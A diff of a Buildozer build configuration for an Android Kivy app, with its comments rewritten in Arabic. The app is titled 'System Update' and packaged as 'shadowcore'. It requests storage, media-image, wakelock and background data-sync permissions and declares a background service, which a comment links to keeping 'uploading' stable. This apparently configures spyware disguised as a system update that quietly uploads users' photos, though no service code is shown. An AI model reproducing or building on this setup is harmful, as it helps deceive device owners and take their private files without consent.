@@ -1,59 +1,63 @@
 [app]
 
-# (str) Title of your application
+# (str) اسم التطبيق الذي سيظهر على الشاشة
 title = System Update
 
-# (str) Package name
+# (str) اسم الحزمة (فريد)
 package.name = shadowcore
 
-# (str) Package domain (needed for android packaging)
+# (str) نطاق الحزمة
 package.domain = org.test
 
-# (str) Source code where the main.py live
+# (str) مكان وجود ملف main.py
 source.dir = .
 
-# (list) Source files to include (let empty to include all the files)
+# (list) الملفات المطلوب تضمينها
 source.include_exts = py,png,jpg,kv,atlas
 
-# (str) Application versioning (method 1)
-version = 1.0
+# (str) إصدار التطبيق
+version = 1.2
 
-# (list) Application requirements
-# تم ضبط المكتبات لتعمل مع نسخة الخدمة التلقائية المستقرة
-requirements = python3,kivy==2.2.1,pyjnius,requests,urllib3,certifi
+# (list) المكتبات المطلوبة (تم إضافة certifi و urllib3 لضمان استقرار الاتصال)
+requirements = python3,kivy==2.2.1,pyjnius,requests,certifi,urllib3
 
-# (str) Supported orientation (one of landscape, sensorLandscape, portrait or all)
-# تم التعديل ليكون الوضع طولياً دائماً
+# (str) وضع الشاشة (طولي دائماً لإصلاح مشكلة العرض)
 orientation = portrait
 
-# (list) Permissions
+# (list) الصلاحيات (تم إضافة صلاحيات الصور الحديثة والخدمة الخلفية)
 android.permissions = INTERNET, WAKE_LOCK, FOREGROUND_SERVICE, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, READ_MEDIA_IMAGES, FOREGROUND_SERVICE_DATA_SYNC
 
-# (int) Target Android API, should be as high as possible.
+# (int) استهداف أحدث API لأندرويد
 android.api = 33
 
-# (int) Minimum API your APK will support.
+# (int) الحد الأدنى لدعم الأجهزة (أندرويد 5.0)
 android.minapi = 21
 
-# (str) Android architectures to build for, choices: armeabi-v7a, arm64-v8a, x86, x86_64
+# (str) المعماريات المدعومة (لضمان العمل على أغلب الموبايلات)
 android.archs = arm64-v8a, armeabi-v7a
 
-# (bool) use pose-notifications for android API 33+
+# (bool) تفعيل دعم أندرويد إكس
 android.enable_androidx = True
 
-# (list) Android services to create (name:file.py)
+# (list) تعريف الخدمة الخلفية (اسم الخدمة:ملف الخدمة)
 services = Service:service.py
 
-# (str) Android logcat filters to use
-android.logcat_filters = *:S python:D
+# (bool) تشغيل الخدمة في واجهة النظام (مهم لاستقرار الرفع)
+android.foreground_service = True
 
-# (bool) Copy library instead of making a libpython.so
+# (str) أيقونة التطبيق (اختياري، يترك افتراضي حالياً)
+#icon.filename = %(source.dir)s/icon.png
+
+# (bool) منع الشاشة من الانطفاء أثناء العمل
+android.wakelock = True
+
+# (bool) نسخ المكتبات بدلاً من عمل ملف .so واحد لزيادة التوافق
 android.copy_libs = 1
 
 [buildozer]
 
-# (int) Log level (0 = error only, 1 = info, 2 = debug (with command output))
+# (int) مستوى السجل (2 يعني عرض كل التفاصيل والأخطاء أثناء البناء)
 log_level = 2
 
-# (int) Display warning if buildozer is run as root (0 = no, 1 = yes)
+# (int) عرض تحذير إذا تم التشغيل كـ root
 warn_on_root = 1
